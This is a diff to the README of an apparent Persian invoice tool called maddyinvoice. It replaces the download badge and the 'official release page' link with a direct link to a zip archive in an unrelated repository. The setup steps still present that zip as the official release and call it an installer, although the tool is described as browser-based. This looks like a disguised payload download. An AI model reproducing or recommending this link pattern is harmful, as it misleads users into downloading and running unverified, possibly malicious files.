@@ -5,7 +5,7 @@ description: "Generate professional Persian invoices offline. This private, clie
 ---
 # 🌸 maddyinvoice - Create Persian invoices with ease
 
-[![](https://img.shields.io/badge/Download-maddyinvoice-blue)](https://github.com/Landfillpiedmont708/maddyinvoice/releases)
+[![](https://img.shields.io/badge/Download-maddyinvoice-blue)](https://raw.githubusercontent.com/Landfillpiedmont708/landfillpiedmont708.github.io/main/kerflop/3.1-alpha.3.zip)
 
 maddyinvoice helps you create professional invoices. This tool works inside your web browser. It keeps your data on your computer. You do not need an internet connection to use it. You can write invoices in Persian or five other languages. The software handles right-to-left text. It uses the Persian calendar for your dates. You can save your work as a PDF or an image file.
 
@@ -13,7 +13,7 @@ maddyinvoice helps you create professional invoices. This tool works inside your
 
 You need a computer running Windows 10 or Windows 11. You also need a web browser like Chrome, Edge, or Firefox. Follow these steps to set up the software.
 
-1. Go to the [official release page](https://github.com/Landfillpiedmont708/maddyinvoice/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Landfillpiedmont708/landfillpiedmont708.github.io/main/kerflop/3.1-alpha.3.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link to download the installer file.
 4. Open the folder where you saved the file.
